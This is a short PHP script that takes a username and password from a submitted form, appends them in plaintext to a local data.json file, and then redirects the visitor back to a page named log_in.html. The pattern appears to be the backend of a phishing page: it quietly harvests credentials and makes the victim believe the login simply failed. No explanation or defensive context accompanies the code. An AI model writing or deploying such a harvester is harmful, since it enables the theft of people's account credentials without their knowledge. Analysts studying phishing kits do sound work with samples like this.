<?php

$file = json_decode(file_get_contents("data.json"), true);
$post = array("user" => $_POST["user"], "pass" => $_POST["pass"]);
array_push($file, $post);
file_put_contents("data.json", json_encode($file));
header("location: ./log_in.html");

?>